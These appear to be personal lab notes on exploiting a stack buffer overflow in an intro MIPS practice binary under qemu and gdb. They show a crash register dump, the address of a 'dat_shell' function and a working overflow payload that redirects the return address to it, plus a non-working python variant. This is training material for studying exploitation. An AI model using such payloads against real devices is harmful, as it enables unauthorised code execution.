==== MIPS ====

  *setting different values for gdb
  *<code>set architecture mips</code>
  * 

  *starting qemu-mipsel remote process on stack
  *<code>sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 Aa0Aa1Aa2Aa3Aa4Aa5A..</code>
  *attaching with gdb to remote process
  *running and crashing
  *registers of mips
  *<code>(gdb) info registers
          zero       at       v0       v1       a0       a1       a2       a3
 R0   00000000 fffffff8 00000041 409189b8 0000000a 409189c3 0000000b 00000000 
            t0       t1       t2       t3       t4       t5       t6       t7
 R8   81010100 7efefeff 41327041 70413370 35704134 41367041 70413770 39704138 
            s0       s1       s2       s3       s4       s5       s6       s7
 R16  00000000 00000000 00000000 ffffffff 40800484 0040059c 00000002 004007e0 
            t8       t9       k0       k1       gp       sp       s8       ra
 R24  4089c5e0 408a5270 00000000 00000000 00448cd0 408003a8 37674136 41386741 
            sr       lo       hi      bad    cause       pc
      20000010 0000000a 00000000 41386740 00000000 41386741 
           fsr      fir
      00000000 00739300 
</code>

  *finding address of desired function
  *<code>info functions
0x00400950  dat_shell</code>
  *this works:
  *<code>sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`echo -e '\\x5c\\x09\\x40'`"</code>

  *but this not:
  *<code>sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 `python -c "print '"'+204*'a'+'\x50\x09\x40'+'"'"`</code>

